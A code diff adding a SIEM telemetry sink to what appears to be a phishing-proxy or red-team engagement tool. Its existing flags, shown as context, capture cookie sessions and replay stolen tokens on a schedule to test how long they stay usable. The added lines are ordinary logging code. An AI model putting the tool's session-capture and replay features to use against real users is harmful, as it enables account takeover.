@@ -27,6 +27,7 @@ import (
 	"github.com/s4l1hs/olta/pkg/telemetry"
 	feedsink "github.com/s4l1hs/olta/pkg/telemetry/sink/feed"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/jsonl"
+	"github.com/s4l1hs/olta/pkg/telemetry/sink/siem"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/webhook"
 	"go.uber.org/zap"
 )
@@ -59,7 +60,17 @@ var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js",
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
 var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook that receives every engagement telemetry stage")
 var telemetry_file = flag.String("telemetry-file", "", "Append ATT&CK-tagged telemetry events to this JSONL file")
+var siem_url = flag.String("siem-url", "", "SIEM endpoint that receives every telemetry event in a native schema: a Splunk HEC collector or an Elasticsearch/OpenSearch document endpoint. The token is read from the OLTA_SIEM_TOKEN environment variable")
+var siem_transport = flag.String("siem-transport", string(siem.TransportElastic), "SIEM delivery dialect: elastic or splunk_hec")
+var siem_schema = flag.String("siem-schema", string(siem.SchemaECS), "SIEM document schema: ecs or ocsf")
+var siem_auth_scheme = flag.String("siem-auth-scheme", "ApiKey", "Authorization scheme for -siem-transport=elastic (ignored for splunk_hec, which always uses Splunk)")
+var siem_sourcetype = flag.String("siem-sourcetype", "olta:telemetry", "Splunk sourcetype for -siem-transport=splunk_hec (ignored by elastic)")
 var session_recheck_schedule = flag.String("session-recheck-schedule", "5m,30m,2h,8h,24h", "Comma-separated delays after capture at which a still-valid session is replayed again, measuring how long a stolen token stays usable (empty disables rechecks)")
+
+// siemTokenEnvironment names the environment variable holding the SIEM
+// endpoint's credential. It is not a flag on purpose: flag values appear in
+// ps output for every user on the host.
+const siemTokenEnvironment = "OLTA_SIEM_TOKEN"
 
 // parseRecheckSchedule turns the -session-recheck-schedule flag into the
 // delays the validation worker re-arms a session at. An empty value means no
@@ -86,6 +97,16 @@ func parseRecheckSchedule(value string) ([]time.Duration, error) {
 		schedule = append(schedule, delay)
 	}
 	return schedule, nil
+}
+
+// siemSchemaForTelemetry reports the SIEM schema for the startup event, or
+// an empty string when no SIEM destination is configured -- so a report never
+// shows a schema for a sink that does not exist.
+func siemSchemaForTelemetry(configured bool, schema string) string {
+	if !configured {
+		return ""
+	}
+	return strings.ToLower(strings.TrimSpace(schema))
 }
 
 func joinPath(base_path string, rel_path string) string {
@@ -135,6 +156,14 @@ type startupTelemetryConfig struct {
 	// encrypted at rest for this engagement. It is a posture boolean, never
 	// the key itself.
 	SecretsEncryptionEnabled bool
+
+	// SIEMConfigured reports whether a native-schema SIEM destination was
+	// configured. Presence only: the endpoint URL and its credential are
+	// both sensitive, and this event fans out to every sink.
+	SIEMConfigured bool
+	// SIEMSchema is the document schema in use ("ecs" or "ocsf"), a
+	// non-secret enum. Empty when no SIEM destination is configured.
+	SIEMSchema string
 
 	// Turnstile, WebhookURL, CampaignDBDriver, and CampaignDBTLSCA hold the
 	// raw flag values that can carry a secret, on purpose: -turnstile is a
@@ -192,6 +221,8 @@ func buildStartupEvent(cfg startupTelemetryConfig) telemetry.Event {
 		WithDetail("session_validator_enabled", cfg.SessionValidatorEnabled).
 		WithDetail("feed_enabled", cfg.FeedEnabled).
 		WithDetail("secrets_encryption_enabled", cfg.SecretsEncryptionEnabled).
+		WithDetail("siem_configured", cfg.SIEMConfigured).
+		WithDetail("siem_schema", cfg.SIEMSchema).
 		// Presence/enum only below -- never the secret value itself.
 		WithDetail("turnstile_enabled", cfg.Turnstile != "").
 		WithDetail("webhook_configured", strings.TrimSpace(cfg.WebhookURL) != "").
@@ -375,6 +406,26 @@ func main() {
 			return
 		}
 		sinks = append(sinks, fileSink)
+	}
+	siemConfigured := strings.TrimSpace(*siem_url) != ""
+	if siemConfigured {
+		// The token comes from the environment, never a flag: a flag value
+		// is visible in ps output to every user on the host, and this
+		// repository already reads its other credentials (OLTA_MASTER_KEY,
+		// OLTA_FEED_VIEWER_TOKEN) the same way.
+		siemSink, err := siem.New(siem.Config{
+			Endpoint:   *siem_url,
+			Transport:  siem.Transport(strings.ToLower(strings.TrimSpace(*siem_transport))),
+			Schema:     siem.Schema(strings.ToLower(strings.TrimSpace(*siem_schema))),
+			Token:      os.Getenv(siemTokenEnvironment),
+			AuthScheme: *siem_auth_scheme,
+			SourceType: *siem_sourcetype,
+		})
+		if err != nil {
+			log.Fatal("configure siem sink: %v (set %s for the endpoint's credential)", err, siemTokenEnvironment)
+			return
+		}
+		sinks = append(sinks, siemSink)
 	}
 	// One identity per proxy process, stamped by the bus onto every event.
 	// It says which proxy served an event when several write to one campaign
@@ -589,6 +640,8 @@ func main() {
 		SessionValidatorEnabled:  *enable_session_validator,
 		FeedEnabled:              *feed_enabled,
 		SecretsEncryptionEnabled: secretsEncryptionEnabled,
+		SIEMConfigured:           siemConfigured,
+		SIEMSchema:               siemSchemaForTelemetry(siemConfigured, *siem_schema),
 		Turnstile:                *turnstile,
 		WebhookURL:               *webhook_url,
 		CampaignDBDriver:         *campaign_db_driver,
